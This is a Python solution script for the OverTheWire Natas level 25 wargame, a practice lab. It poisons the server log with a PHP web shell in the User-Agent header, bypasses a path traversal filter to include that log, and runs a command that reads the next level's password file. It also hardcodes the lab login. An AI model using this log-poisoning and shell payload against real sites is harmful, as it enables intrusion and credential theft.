import requests
from requests.auth import HTTPBasicAuth

basicAuth = HTTPBasicAuth('natas25', 'UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo')
url = "http://natas25.natas.labs.overthewire.org/index.php"

s = requests.Session()
s.auth = basicAuth

# Step 1 (already done) — poison the log with malicious User-Agent
headers = {"User-Agent": "<?php system($_GET['cmd']); ?>"}
s.get(url, params={"lang": "../"}, headers=headers)

# Step 2 — reuse the SAME session, now include the poisoned log file
traversal = "....//" * 5
target = "var/www/natas/natas25/logs/natas25_" + s.cookies.get("PHPSESSID") + ".log"
payload = traversal + target

r = s.get(url, params={"lang": payload, "cmd": "cat /etc/natas_webpass/natas26"})
print(r.text)
